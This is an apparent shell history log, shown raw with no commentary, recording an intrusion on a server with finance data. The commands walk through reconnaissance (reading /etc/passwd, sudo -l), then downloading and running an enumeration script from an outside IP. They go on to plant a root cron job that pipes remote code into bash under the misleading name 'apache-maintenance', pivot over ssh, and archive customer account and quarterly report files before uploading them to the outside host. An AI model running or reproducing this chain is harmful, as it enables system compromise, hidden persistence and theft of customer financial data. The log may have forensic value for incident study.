#1762851900
ls -la
#1762851972
cd /srv/finance
#1762913882
whoami
#1762913889
id
#1762913900
uname -a
#1762913921
cat /etc/passwd
#1762913945
sudo -l
#1762913988
cd /tmp
#1762914015
wget http://198.51.100.66/lin_enum.sh
#1762914022
chmod +x lin_enum.sh
#1762914025
./lin_enum.sh
#1762914220
echo '*/10 * * * * root curl -s http://198.51.100.66/b | bash' > /etc/cron.d/apache-maintenance
#1762914370
ssh dbadmin@192.168.0.60
#1762914655
cd /srv/finance
#1762914670
tar czf /tmp/fin_backup.tar.gz customer_accounts q4_reports
#1762914700
curl -X POST -F file=@/tmp/fin_backup.tar.gz http://198.51.100.66:8080/upload
